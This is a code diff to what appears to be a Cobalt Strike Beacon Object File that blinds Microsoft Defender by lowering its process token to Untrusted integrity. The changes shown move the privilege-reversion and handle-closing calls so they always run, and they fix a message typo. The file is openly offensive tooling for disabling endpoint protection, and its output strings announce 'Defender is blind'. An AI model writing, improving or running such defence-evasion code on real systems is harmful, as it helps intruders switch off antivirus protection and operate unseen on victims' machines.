@@ -271,12 +271,6 @@ void go(char* args, int len)
 
             BeaconPrintf(CALLBACK_OUTPUT, "[*] Token Integrity set to Untrusted. Defender is blind :)\n");
         }
-        //Drop system privileges
-        ADVAPI32$RevertToSelf();
-        //Close handles
-        KERNEL32$CloseHandle(ptoken);
-        KERNEL32$CloseHandle(phandle);
-
     }
     else if (MSVCRT$_stricmp(action, "check") == 0)
     {
@@ -316,13 +310,13 @@ void go(char* args, int len)
             }
         }
         if (dwIntegrityLevel == SECURITY_MANDATORY_UNTRUSTED_RID)
-            BeaconPrintf(CALLBACK_OUTPUT, "[*] Defender's token is Untrusted- It is  blind!\n");
+            BeaconPrintf(CALLBACK_OUTPUT, "[*] Defender's token is Untrusted- It is blind!\n");
         else //Otherwise token must still be System.
             BeaconPrintf(CALLBACK_ERROR, "Defender's token is SYSTEM! IT IS STILL ACTIVE!\n");
-        ADVAPI32$RevertToSelf();
-
     }
-
-
-    
+    //Drop system privileges
+    ADVAPI32$RevertToSelf();
+    //Close handles
+    KERNEL32$CloseHandle(ptoken);
+    KERNEL32$CloseHandle(phandle);
 }
